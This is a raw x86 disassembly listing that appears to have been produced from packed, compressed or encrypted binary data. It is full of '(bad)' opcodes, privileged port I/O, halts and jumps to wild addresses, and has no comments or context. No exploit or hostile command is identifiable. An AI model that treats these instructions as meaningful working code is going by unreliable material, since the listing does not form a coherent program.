  43e911:	test   DWORD PTR es:[esi-0x29],ebx
  43e915:	std    
  43e916:	mov    edi,0x46299236
  43e91b:	mov    dh,0x80
  43e91d:	and    ecx,DWORD PTR [ebx+ebx*1-0x32]
  43e921:	dec    esi
  43e922:	mov    edi,DWORD PTR [edx+edx*1]
  43e925:	aam    0x4d
  43e927:	inc    eax
  43e928:	xor    ebx,ecx
  43e92a:	push   ecx
  43e92b:	nop
  43e92c:	sbb    ecx,DWORD PTR [ebp+0x539898c3]
  43e932:	je     0x43e8c4
  43e934:	out    0xe3,al
  43e936:	sub    al,0x50
  43e938:	xchg   edx,eax
  43e939:	sub    ebp,DWORD PTR [ecx+ecx*1+0x55]
  43e93d:	xor    al,BYTE PTR [edi-0x480ea]
  43e943:	addr16 jae 0x43e8ea
  43e946:	loopne 0x43e948
  43e948:	add    BYTE PTR [eax],al
  43e94a:	add    BYTE PTR [eax],al
  43e94c:	pop    edi
  43e94d:	aam    0x8c
  43e94f:	js     0x43e8d1
  43e951:	mov    dl,0xf7
  43e953:	push   eax
  43e954:	mov    eax,ds:0xd1bea869
  43e959:	fiadd  DWORD PTR [eax]
  43e95b:	(bad)  
  43e95c:	cmp    BYTE PTR ds:0x39d9c3c5,al
  43e962:	sbb    ebp,DWORD PTR [eax]
  43e964:	out    dx,al
  43e965:	mov    ecx,0x5268af7
  43e96a:	clc    
  43e96b:	add    ebx,DWORD PTR [ebp-0x77003479]
  43e971:	das    
  43e972:	aas    
  43e973:	(bad)  
  43e974:	or     BYTE PTR ds:0x2fa83e5d,al
  43e97a:	mov    eax,0xb5399545
  43e97f:	sub    DWORD PTR [ecx+0x64],ebx
  43e982:	pop    esp
  43e983:	fisttp WORD PTR [edx-0x10]
  43e986:	fild   WORD PTR [ebx]
  43e988:	gs or  dh,dh
  43e98b:	hlt    
  43e98c:	adc    dh,BYTE PTR [ebx]
  43e98e:	clc    
  43e98f:	add    edx,DWORD PTR [eax+0x15f02a39]
  43e995:	ins    DWORD PTR es:[edi],dx
  43e996:	(bad)  
  43e997:	js     0x43e9f2
  43e999:	mov    edx,0xb38f006f
  43e99e:	cmp    eax,esi
  43e9a0:	mov    BYTE PTR [ecx+ecx*1],bh
  43e9a3:	adc    edx,DWORD PTR ds:0x5978c36c
  43e9a9:	mov    edx,0xb397f06f
  43e9ae:	sbb    eax,esi
  43e9b0:	add    BYTE PTR [eax],al
  43e9b2:	add    BYTE PTR [eax],al
  43e9b4:	add    BYTE PTR [eax+0x1511a93c],cl
  43e9ba:	ins    DWORD PTR es:[edi],dx
  43e9bb:	jecxz  0x43ea35
  43e9bd:	fnstcw WORD PTR [edx-0x4e680f91]
  43e9c3:	mov    ecx,0x893c88ef
  43e9c8:	adc    BYTE PTR ds:0xd978c36d,dl
  43e9ce:	mov    edx,0xac60610e
  43e9d3:	jg     0xbee4a540
  43e9d9:	dec    ebx
  43e9da:	das    
  43e9db:	push   ecx
  43e9dc:	cmc    
  43e9dd:	enter  0x1679,0x61
  43e9e1:	inc    eax
  43e9e2:	lods   al,BYTE PTR ds:[esi]
  43e9e3:	imul   esp,DWORD PTR [edi]
  43e9e6:	mov    ebx,0x2f2a9ea0
  43e9eb:	push   ecx
  43e9ec:	aad    0xa8
  43e9ee:	jns    0x43ea06
  43e9f0:	popa   
  43e9f1:	and    BYTE PTR [edi+ecx*1-0x5f44d871],ch
  43e9f8:	or     ch,BYTE PTR ds:[edi]
  43e9fb:	push   ecx
  43e9fc:	cmc    
  43e9fd:	mov    BYTE PTR [ecx+0x16],bh
  43ea00:	popa   
  43ea01:	out    dx,eax
  43ea02:	stos   DWORD PTR es:[edi],eax
  43ea03:	comiss xmm0,DWORD PTR [eax]
  43ea06:	mov    ebx,0x2ee91ea0
  43ea0b:	push   ecx
  43ea0c:	aad    0x68
  43ea0e:	jns    0x43ea26
  43ea10:	popa   
  43ea11:	out    dx,eax
  43ea12:	stos   DWORD PTR es:[edi],eax
  43ea13:	(bad)  
  43ea14:	pavgb  mm1,QWORD PTR [esi]
  43ea17:	add    esi,esi
  43ea19:	add    BYTE PTR [eax],al
  43ea1b:	add    BYTE PTR [eax],al
  43ea1d:	add    BYTE PTR [ebx+edi*2],bl
  43ea20:	sbb    al,0x72
  43ea22:	add    eax,0xd48fdc0c
  43ea27:	or     bl,BYTE PTR [edx]
  43ea29:	push   esi
  43ea2a:	jl     0x43e9ee
  43ea2c:	imul   BYTE PTR [ebp-0x6e15f533]
  43ea32:	mov    esp,0x1876ea11
  43ea37:	jno    0x43ea3f
  43ea39:	ror    DWORD PTR fs:[ecx+0x2c3b5e13],cl
  43ea40:	push   ecx
  43ea41:	add    DWORD PTR [ecx+0x6faf27f2],esp
  43ea47:	pop    esi
  43ea48:	dec    ecx
  43ea49:	fsubrp st(7),st
  43ea4b:	inc    ebx
  43ea4c:	dec    ecx
  43ea4d:	add    dl,ah
  43ea4f:	in     al,0x44
  43ea51:	ret    0xaf61
  43ea54:	imul   edi,DWORD PTR [edi+0x39],0xffffffaf
  43ea58:	pop    ss
  43ea59:	test   DWORD PTR [esp+ebp*8-0x31ad001a],esi
  43ea60:	iret   
  43ea61:	inc    esi
  43ea62:	popa   
  43ea63:	out    dx,al
  43ea64:	out    0xff,al
  43ea66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea67:	mov    ds:0xe4b25ece,al
  43ea6c:	inc    esp
  43ea6d:	ret    0xaf21
  43ea70:	iret   
  43ea71:	inc    edi
  43ea72:	xor    DWORD PTR [ebx+0x58],ecx
  43ea75:	inc    eax
  43ea76:	sub    esi,ecx
  43ea78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea79:	(bad)  
  43ea7a:	es out dx,eax
  43ea7c:	out    0x5e,al
  43ea7e:	sbb    BYTE PTR [ecx+0x45],0xc2
  43ea82:	add    BYTE PTR [eax],al
  43ea84:	add    BYTE PTR [eax],al
  43ea86:	add    BYTE PTR [ecx],al
  43ea88:	scas   eax,DWORD PTR es:[edi]
  43ea89:	fcmove st,st(4)
  43ea8b:	mov    esp,0x7251f633
  43ea90:	jns    0x43eac0
  43ea92:	xor    esp,DWORD PTR [eax]
  43ea94:	test   DWORD PTR [esp+edi*8-0x8],0xe2000eae
  43ea9c:	in     eax,dx
  43ea9d:	push   ss
  43ea9e:	test   ah,ch
  43eaa0:	lods   al,BYTE PTR ds:[esi]
  43eaa1:	push   cs
  43eaa2:	add    BYTE PTR [ecx+0x248517b6],dh
  43eaa8:	lods   eax,DWORD PTR ds:[esi]
  43eaa9:	push   cs
  43eaaa:	add    BYTE PTR [edx],ch
  43eaac:	jno    0x43eae0
  43eaae:	cmp    dh,dl
  43eab0:	cmp    ebx,edi
  43eab2:	add    DWORD PTR [ecx-0x5b74c052],edi
  43eab8:	mov    dh,0x23
  43eaba:	stc    
  43eabb:	popf   
  43eabc:	lahf   
  43eabd:	xchg   ebx,eax
  43eabe:	inc    edi
  43eabf:	leave  
  43eac0:	xor    eax,0xf7b21857
  43eac5:	pop    ebp
  43eac6:	add    eax,0x753265b0
  43eacb:	nop
  43eacc:	pop    ss
  43eacd:	data16 stc 
  43eacf:	ja     0x43eb42
  43ead1:	int    0x58
  43ead3:	sbb    ebp,DWORD PTR [edi+0x6f]
  43ead6:	mov    esi,0x7a910bb0
  43eadb:	mov    eax,cs
  43eadd:	daa    
  43eade:	add    DWORD PTR [edi+0x57],ecx
  43eae1:	sbb    al,BYTE PTR [edx]
  43eae3:	nop
  43eae4:	or     ecx,DWORD PTR [esi]
  43eae6:	dec    ebp
  43eae7:	sbb    edi,DWORD PTR [edi]
  43eae9:	add    dh,BYTE PTR ds:0x0
  43eaef:	add    BYTE PTR [ecx+0x27],bl
  43eaf2:	adc    eax,0xa5afc587
  43eaf7:	aam    0x3b
  43eaf9:	or     DWORD PTR [ecx-0x17e680c],edx
  43eaff:	rcl    ch,0x7
  43eb02:	adc    al,0x0
  43eb04:	nop
  43eb05:	or     edx,DWORD PTR [ecx+0x6e82a0e4]
  43eb0b:	adc    al,0x1b
  43eb0d:	iret   
  43eb0e:	or     al,BYTE PTR [edi+0x13]
  43eb11:	jecxz  0x43eb28
  43eb13:	or     DWORD PTR [edi],ecx
  43eb15:	xchg   esp,eax
  43eb16:	adc    al,BYTE PTR [eax]
  43eb18:	nop
  43eb19:	mov    WORD PTR [esi+0x10],cs
  43eb1c:	cwde   
  43eb1d:	adc    BYTE PTR [edi+0xe0b9179],dl
  43eb23:	mov    eax,DWORD PTR [ebx+0x43]
  43eb26:	xchg   ecx,eax
  43eb27:	cmc    
  43eb28:	xchg   edi,eax
  43eb29:	or     BYTE PTR [ebp+0xe0b916d],dl
  43eb2f:	mov    bh,0x89
  43eb31:	or     ecx,DWORD PTR [esi]
  43eb33:	add    BYTE PTR [ecx-0x62],bh
  43eb36:	dec    BYTE PTR [eax]
  43eb38:	pop    ss
  43eb39:	mov    al,0x13
  43eb3b:	add    BYTE PTR [eax-0x6be3b174],dl
  43eb41:	sbb    BYTE PTR [ebp+0xe0b9155],dl
  43eb47:	jge    0x43ead4
  43eb49:	mov    dl,0xdf
  43eb4b:	cmp    BYTE PTR [ebx+0x1517bb2b],dl
  43eb51:	fld    TBYTE PTR [edx+edx*2+0x0]
  43eb55:	add    BYTE PTR [eax],al
  43eb57:	add    BYTE PTR [eax],al
  43eb59:	test   al,0x68
  43eb5b:	iret   
  43eb5c:	mov    DWORD PTR [ecx+0x672df7b2],0x14d32862
  43eb66:	add    dh,BYTE PTR [ebp-0x39]
  43eb69:	mov    esi,DWORD PTR [edi]
  43eb6b:	and    dl,BYTE PTR [edx]
  43eb6d:	adc    al,0xd9
  43eb6f:	test   BYTE PTR [ebx],0x90
  43eb72:	sub    eax,0x671517bb
  43eb77:	add    ecx,DWORD PTR [eax+eax*8+0x60616e9e]
  43eb7e:	cmp    eax,0xb29003f7
  43eb83:	add    al,0xa6
  43eb85:	adc    al,0x6f
  43eb87:	mov    edi,0x6eb8d686
  43eb8c:	push   ecx
  43eb8d:	pusha  
  43eb8e:	das    
  43eb8f:	xor    eax,0x3780ec1
  43eb94:	jl     0x43eb94
  43eb96:	add    al,bh
  43eb98:	add    eax,ebp
  43eb9a:	adc    DWORD PTR [edi+0x5a],ebp
  43eb9d:	mov    BYTE PTR ds:0xc00f06b7,dh
  43eba3:	pop    esi
  43eba4:	dec    edx
  43eba5:	dec    esp
  43eba6:	push   0x6e
  43eba8:	dec    edx
  43eba9:	cmp    al,0x3a
  43ebab:	lea    ebp,[esi-0xb]
  43ebae:	dec    ebx
  43ebaf:	mov    DWORD PTR [ebx+0x4ab10bd6],esp
  43ebb5:	pushf  
  43ebb6:	mov    dl,0xf7
  43ebb8:	add    edx,DWORD PTR [eax+0xf03a2b]
  43ebbe:	add    BYTE PTR [eax],al
  43ebc0:	add    BYTE PTR [eax],al
  43ebc2:	push   ss
  43ebc3:	push   0xca588d2f
  43ebc8:	pop    esp
  43ebc9:	pop    ecx
  43ebca:	jo     0x43eb58
  43ebcc:	push   cs
  43ebcd:	jmp    0x43ec0b
  43ebcf:	jno    0x43ebba
  43ebd1:	fwait
  43ebd2:	sbb    esi,DWORD PTR [edx+0x26]
  43ebd5:	jb     0x43ebb1
  43ebd7:	into   
  43ebd8:	xchg   ebp,eax
  43ebd9:	scas   al,BYTE PTR es:[edi]
  43ebda:	imul   esi,DWORD PTR [edi],0x42
  43ebdd:	or     DWORD PTR [esi+0x50b85a00],esp
  43ebe3:	out    dx,al
  43ebe4:	xchg   edi,eax
  43ebe5:	scas   eax,DWORD PTR es:[edi]
  43ebe6:	shl    DWORD PTR ds:0x6b0cad51,cl
  43ebec:	bound  edi,QWORD PTR ss:[ecx-0x1c148b2e]
  43ebf3:	outs   dx,DWORD PTR ds:[esi]
  43ebf4:	jmp    0x6b10134
  43ebf9:	jo     0x43ebc5
  43ebfb:	jbe    0x43eb8a
  43ebfd:	sub    BYTE PTR [edx-0x6c16efc6],cl
  43ec03:	mov    dl,0xbd
  43ec05:	or     DWORD PTR [esi-0x4a],esi
  43ec08:	shl    DWORD PTR [edi+0x54],1
  43ec0b:	mov    ds:0xb293e90e,al
  43ec10:	push   cs
  43ec11:	jmp    0xffcf1e30
  43ec16:	xchg   ebx,eax
  43ec17:	mov    dl,0x95
  43ec19:	cs hlt 
  43ec1b:	outs   dx,DWORD PTR ds:[esi]
  43ec1c:	xchg   ebp,eax
  43ec1d:	cs in  al,0x6f
  43ec20:	jmp    0x8b6e08dd
  43ec25:	fild   WORD PTR [eax]
  43ec27:	add    BYTE PTR [eax],al
  43ec29:	add    BYTE PTR [eax],al
  43ec2b:	xchg   ebx,eax
  43ec2c:	mov    dl,0x8d
  43ec2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ec2f:	jecxz  0x43ecaf
  43ec31:	push   0x32b93f1
  43ec36:	pop    esp
  43ec37:	xchg   ebx,eax
  43ec38:	mov    dl,0xe
  43ec3a:	jmp    0x705a5e59
  43ec3f:	pop    ecx
  43ec40:	scas   al,BYTE PTR es:[edi]
  43ec41:	bound  esp,QWORD PTR [ecx*1+0x67e94e7a]
  43ec48:	jno    0x43ebd7
  43ec4a:	add    BYTE PTR [edi+0x68740e6a],cl
  43ec50:	aaa    
  43ec51:	stos   BYTE PTR es:[edi],al
  43ec52:	je     0x43ec30
  43ec54:	cs (bad) 
  43ec57:	adc    esi,DWORD PTR [eax]
  43ec59:	dec    BYTE PTR [edi-0x4]
  43ec5c:	mov    bh,0x56
  43ec5e:	add    ebp,DWORD PTR [eax-0xff3aad2]
  43ec64:	sbb    DWORD PTR [esi-0x6c4c86ea],ebp
  43ec6a:	push   ebp
  43ec6b:	ins    DWORD PTR es:[edi],dx
  43ec6c:	pop    edx
  43ec6d:	xchg   ecx,eax
  43ec6e:	xchg   cl,dh
  43ec70:	cdq    
  43ec71:	push   cs
  43ec72:	add    al,dh
  43ec74:	and    DWORD PTR [esi-0x6e4cc700],ecx
  43ec7a:	xchg   esi,eax
  43ec7b:	shl    DWORD PTR [ebx+0x6977000e],0x32
  43ec82:	or     BYTE PTR [ecx-0x610022d2],dl
  43ec88:	xchg   ecx,eax
  43ec89:	inc    ebx
  43ec8a:	pop    edi
  43ec8b:	mov    ds:0xc24558,al
  43ec90:	add    BYTE PTR [eax],al
  43ec92:	add    BYTE PTR [eax],al
  43ec94:	dec    ecx
  43ec95:	mov    bl,0xcf
  43ec97:	inc    esi
  43ec98:	and    eax,0xf9ffec1d
  43ec9d:	pop    ecx
  43ec9e:	iret   
  43ec9f:	inc    edi
  43eca0:	xchg   ecx,eax
  43eca1:	adc    bl,BYTE PTR [eax+0x40]
  43eca4:	jmp    0xdf28e4f3
  43eca9:	ds dec eax
  43ecab:	pop    ebx
  43ecac:	add    edx,esi
  43ecae:	out    0xff,al
  43ecb0:	into   
  43ecb1:	pop    esi
  43ecb2:	xchg   ebx,eax
  43ecb3:	in     eax,0x7c
  43ecb5:	hlt    
  43ecb6:	or     DWORD PTR [eax],eax
  43ecb8:	cmp    BYTE PTR [esi-0x19],0xff
  43ecbc:	(bad)  
  43ecbd:	ds inc edi
  43ecbf:	mov    edx,DWORD PTR [ecx+edx*4]
  43ecc2:	test   al,0x20
  43ecc4:	test   eax,0x90ffe37a
  43ecc9:	sub    BYTE PTR [edx-0x33324a7c],ch
  43eccf:	pop    ds
  43ecd0:	nop
  43ecd1:	inc    ebp
  43ecd2:	mov    edi,0xbf4ccccb
  43ecd7:	retf   
  43ecd8:	les    ebx,FWORD PTR [ebp-0x60e4146b]
  43ecde:	sbb    dl,BYTE PTR [edx-0x3d]
  43ece1:	pop    ebp
  43ece2:	in     eax,0xc9
  43ece4:	add    al,0xea
  43ece6:	xchg   esp,eax
  43ece7:	ds xchg esp,eax
  43ece9:	mov    al,ds:0x92cb73d0
  43ecee:	and    bl,BYTE PTR [ecx+ebx*1]
  43ecf1:	cmp    eax,DWORD PTR [edx]
  43ecf3:	xchg   ecx,esp
  43ecf5:	add    ebx,DWORD PTR [ebx+0x6e]
  43ecfb:	add    BYTE PTR [eax],al
  43ecfd:	js     0x43ec8f
  43ecff:	inc    edx
  43ed00:	or     BYTE PTR [ebx+0x130226a5],cl
  43ed06:	stos   BYTE PTR es:[edi],al
  43ed07:	adc    eax,DWORD PTR [edi-0x7881241f]
  43ed0d:	or     BYTE PTR [esi],0xe
  43ed10:	add    BYTE PTR [ecx],bl
  43ed12:	fcomp  QWORD PTR [edx+0x22828c6f]
  43ed18:	or     al,0x9
  43ed1a:	jl     0x43ed09
  43ed1c:	xchg   BYTE PTR [eax-0x339064bd],ah
  43ed22:	aam    0x52
  43ed24:	adc    al,0x90
  43ed26:	mov    ecx,DWORD PTR ds:0x1ec40900
  43ed2c:	xchg   DWORD PTR [eax-0x45],ecx
  43ed2f:	fwait
  43ed30:	inc    edi
  43ed31:	pop    esp
  43ed32:	push   esp
  43ed33:	mov    ?,WORD PTR [edi-0xf1f475]
  43ed39:	fisttp WORD PTR [ebx]
  43ed3b:	push   cs
  43ed3c:	rcl    DWORD PTR [eax],0x50
  43ed3f:	add    eax,0xa94c9000
  43ed44:	clc    
  43ed45:	(bad)  
  43ed46:	mov    dl,0xc4
  43ed48:	ret    
  43ed49:	pop    ecx
  43ed4a:	pop    edi
  43ed4b:	mov    ch,0x7
  43ed4d:	nop
  43ed4e:	cmp    al,BYTE PTR [edx+0x39fda8be]
  43ed54:	popa   
  43ed55:	out    0xb6,al
  43ed57:	test   edi,0xcfbbeecb
  43ed5d:	retf   
  43ed5e:	out    dx,al
  43ed5f:	or     cl,BYTE PTR [ebx+0x0]
  43ed65:	add    BYTE PTR [ebx+0x29],bh
  43ed68:	or     ecx,DWORD PTR [esi*4+0x3ca2ce0]
  43ed6f:	cdq    
  43ed70:	pop    esp
  43ed71:	inc    esp
  43ed72:	xchg   esp,eax
  43ed73:	mov    ecx,0x639d3735
  43ed78:	outs   dx,BYTE PTR ds:[esi]
  43ed79:	push   ebx
  43ed7a:	mov    eax,0x16ef882b
  43ed7f:	(bad)  
  43ed80:	out    0xab,eax
  43ed82:	mov    ecx,0xeabe20fd
  43ed87:	lock repz add ecx,DWORD PTR [eax]
  43ed8b:	cld    
  43ed8c:	xor    BYTE PTR [esi+0x7355f38],bh
  43ed92:	nop
  43ed93:	out    dx,al
  43ed94:	stos   BYTE PTR es:[edi],al
  43ed95:	mov    bh,BYTE PTR [ebx]
  43ed97:	sub    DWORD PTR [ebx+0x1f37c10b],ecx
  43ed9d:	aaa    
  43ed9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ed9f:	sub    DWORD PTR [edi+0x6bfd131f],ecx
  43eda5:	xor    BYTE PTR [ebp+0x64],bl
  43eda8:	ins    BYTE PTR es:[edi],dx
  43eda9:	cmp    BYTE PTR [edi+esi*1-0x3e6dc436],dl
  43edb0:	int3   
  43edb1:	mov    ch,0xd9
  43edb3:	or     dl,dh
  43edb5:	mov    cl,cl
  43edb7:	repnz mov esp,0xd231a508
  43edbd:	hlt    
  43edbe:	pop    edx
  43edbf:	mov    cl,0x74
  43edc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43edc2:	mov    BYTE PTR [edi],dh
  43edc4:	movsx  ecx,WORD PTR [eax+0xaf8da0]
  43edcb:	add    BYTE PTR [eax],al
  43edcd:	add    BYTE PTR [eax],al
  43edcf:	xchg   esp,eax
  43edd0:	jle    0x43ede5
  43edd2:	push   0xfffffffe
  43edd4:	test   eax,0x6755ed68
  43edd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43edda:	xchg   edi,eax
  43eddb:	in     eax,dx
  43eddc:	stc    
  43eddd:	jmp    0x17803510
  43ede2:	jmp    0x64665fef
  43ede7:	int3   
  43ede8:	or     BYTE PTR [edx],0xb0
  43edeb:	(bad)  
  43edec:	(bad)  
  43eded:	(bad)  
  43edee:	(bad)  
  43edef:	jecxz  0x43ee26
  43edf1:	push   eax
  43edf2:	adc    DWORD PTR [ecx],ecx
  43edf4:	jne    0x43ee28
  43edf6:	mov    ecx,0xa495ed34
  43edfb:	fwait
  43edfc:	jge    0x43edd0
  43edfe:	loope  0x43ee4c
  43ee00:	jae    0x43ee24
  43ee02:	jmp    0x9852a09a
  43ee07:	or     bl,BYTE PTR [ebx+0x16]
  43ee0a:	pusha  
  43ee0b:	test   esi,edx
  43ee0d:	not    BYTE PTR [ecx-0x381604fc]
  43ee13:	fcomp  DWORD PTR [ecx+0x4b]
  43ee16:	sub    eax,DWORD PTR [edx+esi*4-0x512e85a]
  43ee1d:	jmp    0x1780b4d0
  43ee22:	jmp    0x2e1ed676
  43ee27:	inc    eax
  43ee28:	call   0x85c8b07
  43ee2d:	xchg   esi,eax
  43ee2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ee2f:	mov    ds:0xc21d6d,eax
  43ee34:	add    BYTE PTR [eax],al
  43ee36:	add    BYTE PTR [eax],al
  43ee38:	clc    
  43ee39:	sbb    ah,BYTE PTR ds:[ebp+0x11]
  43ee3d:	cld    
  43ee3e:	jmp    0x63e7da2c
  43ee43:	dec    edi
  43ee44:	adc    DWORD PTR [ecx+0x2],edi
  43ee47:	add    BYTE PTR [ecx+0x625666c3],dl
  43ee4d:	les    edx,FWORD PTR [esi]
  43ee4f:	cmp    ecx,DWORD PTR [edx]
  43ee51:	les    edx,FWORD PTR [edi]
  43ee53:	mov    ebp,DWORD PTR [edi+0x16]
  43ee56:	xchg   ecx,eax
  43ee57:	pop    esi
  43ee58:	xchg   ecx,eax
  43ee59:	stc    
  43ee5a:	stos   BYTE PTR es:[edi],al
  43ee5b:	je     0x43ee09
  43ee5d:	clc    
  43ee5e:	inc    edi
  43ee5f:	and    al,0x8c
  43ee61:	test   eax,0x3f17b844
  43ee66:	out    0xff,eax
  43ee68:	jb     0x43eec5
  43ee6a:	test   al,0x10
  43ee6c:	test   eax,0xae28582a
  43ee71:	into   
  43ee72:	ficomp DWORD PTR [ebx]
  43ee74:	jns    0x43ee25
  43ee76:	jo     0x43ee79
  43ee78:	cmp    BYTE PTR [esi],bh
  43ee7a:	fimul  DWORD PTR [ebx+0xcce32f1]
  43ee80:	cmp    BYTE PTR [ecx],0x5d
  43ee83:	or     al,0x36
  43ee85:	pop    ebp
  43ee86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ee87:	cld    
  43ee88:	(bad)  
  43ee89:	ds out 0x5b,eax
  43ee8c:	hlt    
  43ee8d:	lock sbb DWORD PTR [eax],eax
  43ee90:	mov    dl,0x64
  43ee92:	sbb    dl,BYTE PTR [edx-0x50]
  43ee95:	mov    ebp,0x5ec0560a
  43ee9a:	and    ch,al
  43ee9c:	add    BYTE PTR [eax],al
  43ee9e:	add    BYTE PTR [eax],al
  43eea0:	add    BYTE PTR [ecx],ch
  43eea2:	ds out 0xff,eax
  43eea5:	mov    dl,0xd7
  43eea7:	mov    ebx,ds
  43eea9:	std    
  43eeaa:	mov    ds:0x2a414693,al
  43eeaf:	pop    eax
  43eeb0:	and    al,0xfe
  43eeb2:	pop    esi
  43eeb3:	out    0xd1,eax
  43eeb5:	jp     0x43eeaa
  43eeb7:	adc    edi,eax
  43eeb9:	das    
  43eeba:	fwait
  43eebb:	push   cs
  43eebc:	add    cl,ch
  43eebe:	scas   al,BYTE PTR es:[edi]
  43eebf:	inc    edi
  43eec0:	pop    esi
  43eec1:	xor    bl,0x42
  43eec4:	pop    ebp
  43eec5:	nop
  43eec6:	inc    edi
  43eec7:	add    eax,DWORD PTR [eax]
  43eec9:	sub    bh,bl
  43eecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43eecc:	clc    
  43eecd:	(bad)  
  43eecf:	inc    edi
  43eed0:	mov    esi,0xcbd20980
  43eed5:	fmul   QWORD PTR [ebx+0x53]
  43eed8:	dec    esp
  43eed9:	sbb    bh,0x4d
  43eedc:	add    bh,dl
  43eede:	enter  0x73e,0x90
  43eee2:	or     DWORD PTR [esi],ecx
  43eee4:	rcl    DWORD PTR [eax-0x47],0xe2
  43eee8:	sbb    eax,0x3fcd0950
  43eeed:	cmp    BYTE PTR [esi],cl
  43eeef:	push   cs
  43eef0:	add    BYTE PTR [eax+0x5ccbd748],dl
  43eef6:	xchg   edi,eax
  43eef7:	cdq    
  43eef8:	jmp    0x43eedb
  43eefa:	mov    eax,ds:0x8c9c6c99
  43eeff:	and    al,0x34
  43ef01:	nop
  43ef02:	inc    eax
  43ef03:	cdq    
  43ef04:	test   DWORD PTR [eax],0x0
  43ef0a:	in     eax,0xb4
  43ef0c:	cdq    
  43ef0d:	dec    ecx
  43ef0e:	lods   al,BYTE PTR ds:[esi]
  43ef0f:	xchg   esp,eax
  43ef10:	inc    ecx
  43ef11:	and    BYTE PTR [eax],bl
  43ef13:	or     ecx,DWORD PTR [esi]
  43ef15:	add    BYTE PTR [eax-0x247b4d64],dl
  43ef1b:	mov    bl,0x38
  43ef1d:	call   edi
  43ef1f:	sbb    ah,BYTE PTR [ebp+0x16c813cd]
  43ef25:	xchg   esi,ecx
  43ef27:	fisttp WORD PTR [esi+0x4514a5bf]
  43ef2d:	mov    eax,0xe0b91
  43ef32:	mov    esi,0x535aaf84
  43ef37:	cmp    eax,0xf35636ce
  43ef3c:	push   ds
  43ef3d:	or     eax,0xb5ca1a1b
  43ef42:	xchg   ecx,eax
  43ef43:	mov    dl,0xf7
  43ef45:	add    edx,DWORD PTR [eax+0x518cd5e5]
  43ef4b:	ret    0x416e
  43ef4e:	mov    ah,0x2b
  43ef50:	and    ch,ah
  43ef52:	mov    ah,0x7d
  43ef54:	(bad)  
  43ef55:	mov    ss,WORD PTR [ecx-0x36]
  43ef58:	or     al,0xbc
  43ef5a:	cmp    eax,0x944e6cca
  43ef5f:	sub    eax,0xcd4ff002
  43ef64:	lahf   
  43ef65:	push   esp
  43ef66:	inc    esi
  43ef67:	or     cl,BYTE PTR [eax+0x6cb29053]
  43ef6d:	inc    ecx
  43ef6e:	add    BYTE PTR [eax],al
  43ef70:	add    BYTE PTR [eax],al
  43ef72:	add    BYTE PTR [eax+0x35],bh
  43ef75:	mov    ah,0x7
  43ef77:	pop    ss
  43ef78:	jno    0x43ef3d
  43ef7a:	pop    edx
  43ef7b:	shl    DWORD PTR [eax-0x59],1
  43ef7e:	add    edx,DWORD PTR [eax+0x47f6f7b2]
  43ef84:	pop    eax
  43ef85:	ins    BYTE PTR es:[edi],dx
  43ef86:	mov    al,ds:0x41fcf5da
  43ef8b:	shr    BYTE PTR [ebx],0xb3
  43ef8e:	mov    bh,0xa4
  43ef90:	icebp  
  43ef91:	leave  
  43ef92:	add    BYTE PTR [edi],cl
  43ef94:	ja     0x43eff1
  43ef96:	mov    ss,WORD PTR [eax+0x2d]
  43ef99:	popf   
  43ef9a:	pop    es
  43ef9b:	or     eax,0xe206e360
  43efa0:	ret    0xee87
  43efa3:	pop    eax
  43efa4:	arpl   WORD PTR [ebp-0x89dfe55],ax
  43efaa:	add    ecx,DWORD PTR ds:0x53860b67
  43efb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43efb1:	int3   
  43efb2:	mov    esp,0x466ccea3
  43efb7:	mov    WORD PTR ds:0xcdc0efa2,gs
  43efbd:	xor    BYTE PTR [ebx+0x5f],dl
  43efc0:	or     cl,BYTE PTR [edi]
  43efc2:	push   ebp
  43efc3:	arpl   WORD PTR [edx-0x359e9df2],si
  43efc9:	lea    ebp,[ebp+0x19693188]
  43efcf:	dec    ecx
  43efd0:	xor    DWORD PTR [ecx+0x5],eax
  43efd3:	fnstsw WORD PTR [eax]
  43efd5:	dec    ecx
  43efd6:	bound  eax,QWORD PTR [eax]
  43efd8:	add    BYTE PTR [eax],al
  43efda:	add    BYTE PTR [eax],al
  43efdc:	call   FWORD PTR [ebx-0x33]
  43efdf:	jb     0x43f033
  43efe1:	retf   0x2f0f
  43efe4:	les    edi,FWORD PTR [edi-0x4c8906b0]
  43efea:	shl    DWORD PTR [edi],1
  43efec:	(bad)  
  43efed:	clc    
  43efee:	jmp    0x417383dc
  43eff3:	int    0xac
  43eff5:	call   0xe9d0dc57
  43effa:	xchg   edi,eax
  43effb:	aaa    
  43effc:	test   al,0x59
  43effe:	sbb    eax,0xf42f3aa9
  43f003:	sbb    al,0x55
  43f005:	in     al,dx
  43f006:	ficomp DWORD PTR [edx*1-0x73db69f4]
  43f00d:	jne    0x43f009
  43f00f:	sbb    ecx,esp
  43f011:	xor    ecx,edi
  43f013:	out    dx,al
  43f014:	out    dx,eax
  43f015:	cmp    esi,edi
  43f017:	call   0xedab1daf
  43f01c:	fdivp  st(2),st
  43f01e:	sbb    DWORD PTR [ebp-0x23],ebp
  43f021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f022:	push   cs
  43f023:	jmp    0xe95e703c
  43f028:	cwde   
  43f029:	cs mov eax,0x8db293da
  43f02f:	loope  0x43efc4
  43f031:	adc    DWORD PTR [edx+ebp*2],0x6c
  43f035:	scas   al,BYTE PTR es:[edi]
  43f036:	push   cs
  43f037:	out    0xa6,al
  43f039:	sbb    eax,0x7593e8fe
  43f03e:	sub    DWORD PTR [eax],eax
  43f040:	add    BYTE PTR [eax],al
  43f042:	add    BYTE PTR [eax],al
  43f044:	add    BYTE PTR [edx],ah
  43f046:	leave  
  43f047:	or     al,0xc7
  43f049:	imul   BYTE PTR [edi+0x26f9000e]
  43f04f:	push   edx
  43f050:	or     al,0x72
  43f052:	sahf   
  43f053:	xchg   ecx,eax
  43f054:	dec    ebp
  43f055:	loope  0x43f07d
  43f057:	push   edx
  43f058:	adc    BYTE PTR [edx+0x73],ah
